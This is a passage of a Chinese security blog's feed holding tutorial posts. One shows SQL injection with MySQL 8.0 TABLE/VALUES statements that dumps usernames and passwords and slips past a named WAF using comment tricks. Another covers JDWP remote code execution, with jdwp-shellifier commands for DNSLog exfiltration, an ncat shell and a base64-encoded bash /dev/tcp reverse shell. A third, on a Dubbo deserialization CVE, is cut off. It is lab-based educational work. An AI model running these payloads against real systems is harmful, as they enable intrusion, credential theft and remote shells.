class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">table</span> security.referers;</span><br><span class="line">table security.users union <span class="keyword">select</span> * <span class="keyword">from</span> security.referers;</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/2.png" alt=""></p><h4 id="SELECT-xx-INTO-OUTFILE替换"><a href="#SELECT-xx-INTO-OUTFILE替换" class="headerlink" title="SELECT xx INTO OUTFILE替换"></a>SELECT xx INTO OUTFILE替换</h4><p>可以使用TABLE替换SELECT xx INTO OUTFILE的SELECT：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">table security.users into outfile 'D:\\tmp\\dump.txt';</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'D:\\tmp\\dump.txt'</span>;</span><br></pre></td></tr></table></figure><p>注意，在使用INTO OUTFILE语句的时候，MySQL会报错：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement</span><br></pre></td></tr></table></figure><p>此时，输入如下sql查询语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show global variables like &apos;%secure_file_priv%&apos;;</span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv | NULL  |</span><br><span class="line">+------------------+-------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure><p>看到secure_file_priv的值为NULL，表示限制不能导入导出。</p><p>secure_file_priv参数用于限制<code>LOAD DATA</code>、<code>SELECT xx INTO OUTFILE</code>、<code>LOAD_FILE()</code>等：</p><ul><li>NULL：表示限制mysqld不允许导入或导出；</li><li>/tmp：表示限制mysqld只能在/tmp目录中执行导入导出，其他目录不能执行；</li><li>没有值：表示不限制mysqld在任意目录的导入导出；</li></ul><p>又因为secure_file_priv参数是只读参数，不能使用set global命令修改。</p><p>正确的解决办法是在my.ini中添加如下配置，然后重启MySQL即可：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">secure_file_priv</span>=<span class="string">''</span></span><br></pre></td></tr></table></figure><p>现在就没问题了：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/3.png" alt=""></p><h4 id="SELECT-xx-INTO-DUMPFILE替换"><a href="#SELECT-xx-INTO-DUMPFILE替换" class="headerlink" title="SELECT xx INTO DUMPFILE替换"></a>SELECT xx INTO DUMPFILE替换</h4><p>和前面OUTFILE是类似的，关键区别在于：</p><ul><li>OUTFILE导出全部数据，DUMPFILE只能导出一行数据；</li><li>OUTFILE在将数据写到文件里时有特殊的格式转换，而DUMPFILE则保持原数据格式；</li></ul><p>因此，在使用DUMPFILE时需要结合limit选定指定行：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table security.users limit 1 into dumpfile 'D:\\tmp\\dump.txt';</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/4.png" alt=""></p><h4 id="子查询替换"><a href="#子查询替换" class="headerlink" title="子查询替换"></a>子查询替换</h4><p>当子查询的表只有单列时，可以使用TABLE语句来替换SELECT进行子查询：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="keyword">table</span> security.vips);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="keyword">select</span> * <span class="keyword">from</span> security.vips);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">where</span> username <span class="keyword">in</span> (<span class="keyword">select</span> <span class="keyword">name</span> <span class="keyword">from</span> security.vips);</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/5.png" alt=""></p><h4 id="INSERT-xx-SELECT替换"><a href="#INSERT-xx-SELECT替换" class="headerlink" title="INSERT xx SELECT替换"></a>INSERT xx SELECT替换</h4><p>参考文档改下即可：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/insert-select.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/insert-select.html</a></p><h4 id="CREATE-TABLE-VIEW-xx-SELECT替换"><a href="#CREATE-TABLE-VIEW-xx-SELECT替换" class="headerlink" title="CREATE TABLE/VIEW xx SELECT替换"></a>CREATE TABLE/VIEW xx SELECT替换</h4><p>参考文档改下即可：</p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/create-table-select.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/create-table-select.html</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/create-view.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/create-view.html</a></p><h3 id="VALUES语句"><a href="#VALUES语句" class="headerlink" title="VALUES语句"></a>VALUES语句</h3><h4 id="用法简介-1"><a href="#用法简介-1" class="headerlink" title="用法简介"></a>用法简介</h4><p>官方文档：<a href="https://dev.mysql.com/doc/refman/8.0/en/values.html" target="_blank" rel="noopener">https://dev.mysql.com/doc/refman/8.0/en/values.html</a></p><p>VALUES是MySQL 8.0.19中引入的DML语句，该语句返回一组一个或多个行作为表。换句话说，它是一个表值构造函数，还可以充当独立的SQL语句。</p><p>用法：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line">    ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line">    value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line">    column_index</span><br></pre></td></tr></table></figure><p>该语句由VALUES关键字组成，后跟一个或多个行构造函数的列表，以逗号分隔。行构造函数由ROW()行构造子句组成，该子句的值列表包含在括号中的一个或多个标量值。值可以是任何MySQL数据类型的文字，也可以是解析为标量值的表达式。</p><p>ROW()不能为空（但提供的每个标量值可以为NULL），并且在同一条VALUES语句中的每个语句的列的数量必须相同。</p><p>简单地说，VALUES语句可以用来构造表：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; values row("q", 42, '2020-02-01'), row(23, "abc", 98.6), row(27.0002, "Mary Smith", '&#123;"a": 10, "b": 25&#125;') limit 2,1;</span><br><span class="line">+<span class="comment">----------+------------+--------------------+</span></span><br><span class="line">| column_0 | column_1   | column_2           |</span><br><span class="line">+<span class="comment">----------+------------+--------------------+</span></span><br><span class="line">| 27.0002  | Mary Smith | &#123;"a": 10, "b": 25&#125; |</span><br><span class="line">+<span class="comment">----------+------------+--------------------+</span></span><br><span class="line">1 row in <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>从输出表的列中看到，其中有隐含命名的列column_0、column_1、 column_2等等，索引从0开始，可使用limit输出指定行。其中的列可以是混合类型。</p><h4 id="UNION联合查询替换-1"><a href="#UNION联合查询替换-1" class="headerlink" title="UNION联合查询替换"></a>UNION联合查询替换</h4><p>根据VALUES语句构造表的特性，可以和UNION联合查询中的SELECT语句进行交叉替换使用：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> security.users <span class="keyword">union</span> <span class="keyword">values</span> <span class="keyword">row</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>), <span class="keyword">row</span>(<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">values row('a','b','c') union <span class="keyword">select</span> * <span class="keyword">from</span> security.users;</span><br><span class="line">values row('a','b','c') union values row(1,2,3); // 可完全省略不用union</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/6.png" alt=""></p><h2 id="0x03-在SQL注入中的利用"><a href="#0x03-在SQL注入中的利用" class="headerlink" title="0x03 在SQL注入中的利用"></a>0x03 在SQL注入中的利用</h2><p>由前面知道，TABLE和VALUES这两个语句可用于替换UNION联合查询中的SELECT进行查询，因此这部分新特性主要针对SELECT部分的过滤进行绕过利用。</p><p>这里以sqli-labs为例。</p><h3 id="VALUES-ROW-替换ORDER-BY推测列数"><a href="#VALUES-ROW-替换ORDER-BY推测列数" class="headerlink" title="VALUES ROW()替换ORDER BY推测列数"></a>VALUES ROW()替换ORDER BY推测列数</h3><p>推测列数无需ORDER BY，直接用VALUES语句即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,2)%23</span><br><span class="line">?id=0&apos; union values row(1,2,3)%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/7.png" alt=""></p><h3 id="UNION-VALUES联合查询"><a href="#UNION-VALUES联合查询" class="headerlink" title="UNION VALUES联合查询"></a>UNION VALUES联合查询</h3><p>应用UNION VALUES语句就能直接调用数据库内置函数查询对应的信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,user(),version())%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/8.png" alt=""></p><p>可以结合concat系列函数进行利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,null,concat_ws(char(32,58,32),user(),database(),version()))%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/9.png" alt=""></p><p>如果WAF仅仅是过滤UNION SELECT关键字，并没有对UNION VALUES后面添加SELECT进行过滤，那么可以像正常一样利用SELECT结合concat做子查询来dump库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,null,(select group_concat(concat_ws(char(32,58,32),id,username,password)) from users))%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/10.png" alt=""></p><p>当然，也可以组合TABLE语句进行查询，注意此时TABLE语句指定的表必须是只有一列且限制只能输出一行：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union values row(1,null,(table vips limit 0,1))%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/11.png" alt=""></p><h3 id="UNION-TABLE联合查询"><a href="#UNION-TABLE联合查询" class="headerlink" title="UNION TABLE联合查询"></a>UNION TABLE联合查询</h3><p>使用UNION TABLE的时候，注意两个表的列数必须相同：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union table referers limit 0,1%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/12.png" alt=""></p><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>利用小于号会逐个比较一行中每一列值的大小来进行盲注，当然，除了小于号、其他比较符可自行构造，如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; or (1,&apos;d&apos;,&apos;&apos;) &lt; (table users limit 1)%23</span><br><span class="line">?id=0&apos; or (1,&apos;e&apos;,&apos;&apos;) &lt; (table users limit 1)%23</span><br><span class="line">?id=0&apos; or (1,&apos;dumb&apos;,&apos;dumb&apos;) &lt; (table users limit 1)%23</span><br><span class="line">?id=0&apos; or (1,&apos;dumb&apos;,&apos;dumb&apos;) = (table users limit 1)%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/13.png" alt=""></p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/14.png" alt=""></p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/15.png" alt=""></p><h2 id="0x04-xx绕过"><a href="#0x04-xx绕过" class="headerlink" title="0x04 xx绕过"></a>0x04 xx绕过</h2><p>本地测试xx当前版本号为V4.0.23137。</p><p>用UNION SELECT妥妥的直接被拦截了：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/16.png" alt=""></p><p>使用UNION VALUES就能成功绕过：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/17.png" alt=""></p><p>使用UNION TABLE也能成功绕过，但要注意两个表的列数必须相同才行：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/18.png" alt=""></p><p>直接使用TABLE语句盲注查询，会被拦截：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/19.png" alt=""></p><p>关键的拦截特征在于将or与后面字符匹配到了，这里利用注释符的一个Trick来实现绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; or/*!90000mmmmmmmm*/(1,&apos;d&apos;,&apos;&apos;) &lt; (table users limit 0,1)%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/20.png" alt=""></p><p>盲注当然是OK的，就是注入过程比较慢，这里可以使用前面说到的UNION VALUES后面添加SELECT查询的方式来尝试，原payload当然会被拦截：</p><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/21.png" alt=""></p><p>这里推测WAF过滤的关键点也是在于UNION之后以及SELECT之后的关键词正则匹配，要断开这种关键词匹配同样使用前面的Trick即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=0&apos; union/*!90000mmmmmmmm*/values row(1,null,(select/*!90000mmmmmmmm*/group_concat(concat_ws(char(32,58,32),id,username,password)) from users))%23</span><br></pre></td></tr></table></figure><p><img src="/2021/09/01/利用MySQL8-0新特性绕过WAF/22.png" alt=""></p><p>OK，确实可以绕过xx。</p><h2 id="0x0n-参考"><a href="#0x0n-参考" class="headerlink" title="0x0n 参考"></a>0x0n 参考</h2><p><a href="https://dev.mysql.com/doc/refman/8.0/en/table.html" target="_blank" rel="noopener">TABLE Statement</a></p><p><a href="https://dev.mysql.com/doc/refman/8.0/en/values.html" target="_blank" rel="noopener">VALUES Statement</a></p><p><a href="https://xz.aliyun.com/t/8646" target="_blank" rel="noopener">MYSQL8.0注入新特性</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Web安全基础" scheme="https://www.mi1k7ea.com/categories/Web%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="MySQL" scheme="https://www.mi1k7ea.com/tags/MySQL/"/>
    
      <category term="SQL注入" scheme="https://www.mi1k7ea.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>浅析JDWP远程命令执行漏洞</title>
    <link href="https://www.mi1k7ea.com/2021/08/06/%E6%B5%85%E6%9E%90JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"/>
    <id>https://www.mi1k7ea.com/2021/08/06/浅析JDWP远程代码执行漏洞/</id>
    <published>2021-08-06T05:02:14.000Z</published>
    <updated>2021-10-12T16:01:22.125Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习</p><h2 id="0x01-基本概念"><a href="#0x01-基本概念" class="headerlink" title="0x01 基本概念"></a>0x01 基本概念</h2><h3 id="JPDA"><a href="#JPDA" class="headerlink" title="JPDA"></a>JPDA</h3><p>JPDA（Java Platform Debugger Architecture）即Java平台调试体系架构，其整体架构如图：</p><p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/2.png" alt=""></p><p>整体分为三层：</p><ul><li>JVMTI：Java VM Tool Interface即JVM工具接口。Debuggee即被调试者是由被调试的应用程序（未显示）、运行应用程序的VM和调试器后端组成。为了可远程调试，JVM实例必须使用命令行参数<code>-Xdebug</code>以及参数<code>-Xrunjdwp</code>（或<code>-agentlib</code>）显式启动。其中调试器后端是使用JVMTI来定义JVM提供的调试服务；</li><li>JDWP：Java Debug Wire Protocol是Debugger和JVM实例之间的通信协议；</li><li>JDI：Java Debug Interface即Java调试接口，是JDWP协议的客户端，调试器通过其来远程调试目标JVM中的应用；</li></ul><h3 id="JDWP"><a href="#JDWP" class="headerlink" title="JDWP"></a>JDWP</h3><p>JDWP（Java Debugger Wire Protocol）即Java调试线协议，是一个为Java调试而设计的通讯交互协议。在JPDA（Java Platform Debugger Architecture）中，它定义了调试器（Debugger）和被调试的JVM（Debuggee）之间的通信协议。</p><p>具体JDWP协议可参考官方文档：<a href="https://docs.oracle.com/en/java/javase/11/docs/specs/jdwp/jdwp-protocol.html" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/11/docs/specs/jdwp/jdwp-protocol.html</a></p><h2 id="0x02-JDWP远程命令执行漏洞"><a href="#0x02-JDWP远程命令执行漏洞" class="headerlink" title="0x02 JDWP远程命令执行漏洞"></a>0x02 JDWP远程命令执行漏洞</h2><h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>如果目标Java应用开启了JDWP服务且对外开放，则攻击者可利用JDWP实现远程代码执行。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>以Windows为例，下载Tomcat到本地，在startup.bat中上面添加如下代码开启debug模式：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000</span><br></pre></td></tr></table></figure><p>跑起Tomcat即可。</p><h3 id="FOFA语法"><a href="#FOFA语法" class="headerlink" title="FOFA语法"></a>FOFA语法</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">banner=&quot;jdwp&quot;</span><br></pre></td></tr></table></figure><h3 id="服务探测"><a href="#服务探测" class="headerlink" title="服务探测"></a>服务探测</h3><p>有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送<code>JDWP-Handshake</code>，如果目标服务直接返回一样的内容则说明是JDWP服务。</p><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><p>使用Nmap扫描：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sT -sV 192.168.192.1 -p 8000</span><br></pre></td></tr></table></figure><p>扫描会识别到JDWP服务，且有对应的JDK版本信息：</p><p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/1.png" alt=""></p><h4 id="Telnet"><a href="#Telnet" class="headerlink" title="Telnet"></a>Telnet</h4><p>使用Telnet命令探测，需要马上输入<code>JDWP-Handshake</code>，然后服务端返回一样的内容，证明是JDWP服务：</p><p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/3.png" alt=""></p><h4 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h4><p>使用如下脚本扫描也可以，直接连接目标服务发送<code>JDWP-Handshake</code>，然后接受到相同内容则说明是JDWP服务：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">client = socket.socket()</span><br><span class="line">client.connect((<span class="string">"127.0.0.1"</span>, <span class="number">8000</span>))</span><br><span class="line">client.send(<span class="string">b"JDWP-Handshake"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> client.recv(<span class="number">1024</span>) == <span class="string">b"JDWP-Handshake"</span>:</span><br><span class="line">    print(<span class="string">"[*]JDWP Service!"</span>)</span><br><span class="line"></span><br><span class="line">client.close()</span><br></pre></td></tr></table></figure><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>漏洞利用可借助以下三个工具。</p><h4 id="jdwp-shellifier"><a href="#jdwp-shellifier" class="headerlink" title="jdwp-shellifier"></a>jdwp-shellifier</h4><p>直接用GitHub上已有的工具：<a href="https://github.com/IOActive/jdwp-shellifier" target="_blank" rel="noopener">https://github.com/IOActive/jdwp-shellifier</a></p><p>该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。</p><p>需要Python2运行。</p><p>默认break on是在java.net.ServerSocket.accept方法上，</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t <span class="number">127.0</span>.<span class="number">0.1</span> -p <span class="number">8000</span> --cmd <span class="string">"calc"</span></span><br></pre></td></tr></table></figure><p>直接设置断点函数为<code>java.lang.String.indexOf</code>会更快速：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t <span class="number">127.0</span>.<span class="number">0.1</span> -p <span class="number">8000</span> --break-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"calc"</span></span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/4.png" alt=""></p><p>但是前面的命令虽然执行了但是看不到回显，在Linux环境下可以利用DNSLog外带回显：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"ping -nc 1 `whoami`.xxx.dnslog.cn"</span></span><br></pre></td></tr></table></figure><p>反弹shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"ncat -lvvp 1234 -e /bin/bash"</span></span><br><span class="line"><span class="comment"># 下面这种不能直接运行/bin/bash -i &gt;&amp; /dev/tcp/127.0.0.1/12345 0&gt;&amp;1来反弹</span></span><br><span class="line"><span class="comment"># 跟Java的exec()反弹一个原理，可用Base64绕过</span></span><br><span class="line">python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"bash -c &#123;echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEyNy4wLjAuMS8xMjM0NSAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span></span><br></pre></td></tr></table></figure><h4 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h4><p>在msf中可以使用<code>exploit/multi/misc/java_jdwp_debugger</code>模块进行攻击利用。</p><p>原理是去找sleeping中的线程，然后下发单步指令是程序断下来，从而触发命令执行。</p><h4 id="jdb"><a href="#jdb" class="headerlink" title="jdb"></a>jdb</h4><p>jdb是JDK中自带的命令行调试工具。</p><p>这里是按照msf中的方式搞：</p><ol><li>attach到远程JDWP服务；</li><li><code>threads</code>命令查看所有线程，查找sleeping的线程；</li><li><code>thread sleeping的线程id</code>，然后<code>stepi</code>进入该线程；</li><li>通过<code>print|dump|eval</code>命令，执行Java表达式从而达成命令执行；</li></ol><p>这里本地<code>-attach</code>参数连接会出差，换为下面的方式：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdb -connect com.sun.jdi.SocketAttach:hostname=<span class="number">127.0</span>.<span class="number">0.1</span>,port=<span class="number">8000</span></span><br></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval java.lang.Runtime.getRuntime().exec(<span class="string">"calc"</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/08/06/浅析JDWP远程代码执行漏洞/5.png" alt=""></p><p>当然是可以实现直接回显的，可自行研究。</p><h3 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>关闭JDWP服务，或限制JDWP服务不对外开放；</li><li>关闭Java Debug模式；</li></ul><h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://ioactive.com/hacking-java-debug-wire-protocol-or-how/" target="_blank" rel="noopener">Hacking the Java Debug Wire Protocol – or – “How I met your Java debugger”</a></p><p><a href="https://docs.oracle.com/en/java/javase/11/docs/specs/jpda/architecture.html" target="_blank" rel="noopener">https://docs.oracle.com/en/java/javase/11/docs/specs/jpda/architecture.html</a></p><p><a href="https://xz.aliyun.com/t/7303" target="_blank" rel="noopener">JDWP无依赖攻击</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/categories/Java/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Java" scheme="https://www.mi1k7ea.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>浅析Dubbo HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）</title>
    <link href="https://www.mi1k7ea.com/2021/07/03/%E6%B5%85%E6%9E%90Dubbo-HttpInvokerServiceExporter%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2019-17564%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/07/03/浅析Dubbo-HttpInvokerServiceExporter反序列化漏洞（CVE-2019-17564）/</id>
    <published>2021-07-03T09:12:38.000Z</published>
    <updated>2021-07-10T09:26:45.339Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>学习Dubbo历史洞。</p><h2 id="0x01-漏洞原理"><a href="#0x01-漏洞原理" class="headerlink" title="0x01 漏洞原理"></a>0x01 漏洞原理</h2><p>Apache Dubbo在使用HTTP协议进行通信时，是直接使用了Spring框架的<code>org.springframework.remoting.httpinvoker.HttpInvokerServiceExporter</code>类做远程调用的，而这个过程会读取POST请求的Body内容并进行反序列化操作，从而导致反序列化漏洞的存在进而RCE。</p><h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02 影响版本"></a>0x02 影响版本</h2><ul><li>Apache Dubbo 2.7.0 to 2.7.4；</li><li>Apache Dubbo 2.6.0 to 2.6.7；</li><li>Apache Dubbo all 2.5.x；</li></ul><h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03 环境搭建"></a>0x03 环境搭建</h2><p>十分方便的环境搭建可参考Vulhub：<a href="https://github.com/vulhub/vulhub/tree/master/dubbo/CVE-2019-17564" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/dubbo/CVE-2019-17564</a></p><p>这里采用本地搭建的方式。</p><p>下载dubbo-samples项目中的dubbo-samples-http子项目：<a href="https://github.com/apache/dubbo-samples" target="_blank" 